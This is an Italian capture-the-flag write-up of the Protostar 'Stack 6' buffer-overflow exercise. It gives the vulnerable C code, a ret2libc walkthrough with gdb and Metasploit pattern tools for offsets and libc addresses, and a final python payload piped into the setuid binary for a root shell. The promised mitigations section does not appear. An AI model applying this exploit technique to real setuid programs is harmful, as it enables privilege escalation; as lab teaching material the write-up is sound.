#### Introduzione
Protostar risulta essere una macchina virtuale contenente esercizi di sicurezza. Precisamente introduce problemi di danneggiamento della memoria di base come “buffer overflow", “format strings” e “sfruttamento dell’heap in un sistema Linux vecchio stile”. Per “vecchio stile” intendiamo un sistema che non presenta alcuna forma di moderni sistemi di mitigazione abilitata.
Per chiarezza, ciascun esercizio corrisponde ad un livello, per un totale di 24 esercizi suddivisi per temi.
In questo documento tratteremo dell’esercizio Stack 6, legato alla tematica “Stack - Based Buffer Overflow”. In particolare, introdurremo l’esercizio in sé, due possibili soluzioni per vincere la CTF e, infine, eventuali mitigazioni da applicare per evitare che l’attacco avvenga con successo.

#### Traccia

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```
Questo livello può essere fatto in diversi modi. Si consiglia vivamente di sperimentare diversi modi per vincere la sfida.
Obiettivo della sfida: eseguire del codice arbitrario a tempo di esecuzione.
I passi da applicare per arrivare alla soluzione della sfida sono:
1.	Raccolta di informazioni sul sistema.
2.	Aggiornare l’albero d’attacco. 
3.	Individuare un percorso possibile e provare l’attacco.
4.	Se l’attacco riesce, la sfida è vinta. 
5.	Se l’attacco non riesce, ricominciare dal punto 1.

#### Raccolta delle informazioni
Il programma stack6 accetta input locali, ovvero accetta stringhe generiche inviate tramite tastiera o altro processo (pipe).
Inoltre, esaminando i metadati di stack6, attraverso il comando ls -l stack6 scopriamo che ha il bit SETUID acceso a ROOT (quindi eseguire il programma e vincere la sfida ci permette di ottenere i privilegi dell’utente ROOT).

####ret2libC
Ret2libc permette di aggirare il filtro sull’indirizzo di ritorno. La strategia sfrutta il fatto che la libreria libc viene caricata in memoria e utilizzata anche dal programma stesso.
In questo modo, è possibile impostare l'indirizzo di ritorno all'indirizzo di una qualsiasi funzione della libreria C.
Per prendere il controllo del programma useremo la funzione system(). Sovrascriveremo parte dello stack impostato prima di chiamare getpath() e inietteremo manualmente i frame dello stack per chiamare system(). In particolare, sovrascriveremo l'indirizzo di ritorno di getpath() con system(). Il payload da iniettare nel seguente modo:
"padding + system + exit+/bin/sh"
La funzione exit() viene inserita dopo la system() per assicurarsi che il programma termini correttamente dopo l'esecuzione del comando di shell. 
L'invocazione di exit() garantisce che il programma vittima non continui l'esecuzione oltre il punto in cui è stato sovrascritto il puntatore di ritorno. Subito dopo l'indirizzo di exit(), c'è un puntatore a una posizione di memoria che contiene la stringa /bin/sh, che è l'argomento che vogliamo passare alla funzione system().

padding + system + exit + /bin/sh

I caratteri di padding sono utili in quanto sovrascrivono buffer, spazio lasciato dall’allineamento dello stack, EBP salvato, permettendo di arrivare all’indirizzo di ritorno. Per fare ciò vediamo due tecniche:

1.	Prima tecnica utilizza il gdb (GNU Debugger)
GDB è il debugger predefinito di GNU/Linux che permette di visualizzare cosa accade in un programma durante l’esecuzione o al crash. Attraverso GDB, disassembliamo la funzione getpath e osserviamo l’istruzione lea (load effective address). 
L’istruzione lea carica -0x4c(%ebp) in EAX. Quindi la distanza tra l’inizio del buffer destinato a contenere l’input dell’utente e la cella contenente il saved EBP è 0x4c (=76) byte. Poiché la cella contenente il saved EBP è di 4 byte, servono 76+4=80 byte per raggiungere la cella dell’indirizzo di ritorno

2.	La seconda tecnica prevede l’utilizzo di Metaspoitable Framework. In particolare, utilizziamo due tool:
a.	msf-pattern_create: permette di generare pattern di byte personalizzati di lunghezza specifica.
b.	msf-pattern_offset: consente di identificare l'offset di memoria a cui si trova un valore specifico o un puntatore all'interno di un pattern generato con msf-pattern_create.
Dunque, creiamo dapprima il pattern, specificando una lunghezza sufficientemente grande per il nostro scopo (es. 120). Dopodiché, eseguiamo stack6 tramite gdb, quando ci chiede di inserire la path, incolliamo il pattern precedentemente creato.
Otterremo un messaggio di errore con un determinato indirizzo. A questo punto copiamo l’indirizzo ed effettuiamo una query al secondo tool nel seguente modo:

```console
$ msf-pattern_offset -l 120 -q 0x37634136
[*] Exact match at offset 80
```

Poi seguiamo i seguenti passi:
1.	Trovare l’indirizzo di system() tramite gdb. Inseriamo un breakpoint e partiamo con l’esecuzione. Dopodiché eseguiamo:
p system
0xb7ecffb0 <__libc_system>.
2.	Trovare l’indirizzo di exit:
p exit
0xb7ec60c0 <*__GI_exit>
3.	Troviamo /bin/sh all’interno della libc. Prima individuiamo l’indirizzo in cui inizia libc:
(gdb) info proc mapping
libc inizia all’indirizzo 0xb7e97000. Poiché /bin/sh è una stringa in libc, possiamo trovare l'offset dall'inizio del file:
strings -a -t  x /lib/libc-2.11.2.so | grep /bin/sh
11f3bfL /bin/sh
Avendo individuato l’offset, calcoliamo l’indirizzo di /bin/sh
(python) hex(0xb7e97000 + 0x11f3bfL)
'0xb7fb63bf'
4.	Possiamo verificarlo su gdb:
(gdb) x/s 0xb7fb63bf
0xb7fb63bf:  "/bin/sh"

EXPLOIT FINALE:
```console
python -c "print 'A' * 80 + '\xb0\xff\xec\xb7' + '\xc0\x60\xec\xb7' + '\xbf\x63\xfb\xb7'" > /tmp/exploit

cat /tmp/exploit; cat) | ./stack6
```

Attraverso l’exploit finale riusciamo ad ottenere la shell con i permessi di ROOT e vincere la sfida.
